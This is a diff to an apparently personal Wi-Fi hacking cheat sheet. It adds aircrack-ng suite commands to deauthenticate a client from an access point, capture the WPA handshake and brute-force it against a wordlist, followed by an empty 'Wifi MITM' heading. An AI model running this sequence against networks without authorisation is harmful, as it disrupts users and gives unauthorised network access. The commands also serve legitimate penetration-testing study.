@@ -14,4 +14,13 @@
 
  3.  `airodump-ng -c <CH> --bssid <BSSID> wlan0` - check connections device (stations) to wifi
  
- 4.  
+ 4.  `aireplay-ng -0 10 -a <BSSID> -c <STATION> wlan0` - DOS attach to any STATION device drop from  BSSID (wifi) (this is for catch handshake) (`-0` == `--deauth`, `10` is packet number)
+
+ 5.  `airodump-ng -c <CH> --bssid <BSSID> wlan0 -w <wpahash_file_name>` - Listen wifi device to catch handshake
+
+ 6.  `aircrack-ng -w <wordlist_file> <wpahash_file>` - brute-force to wpahash
+
+
+## Wifi MITM
+
+
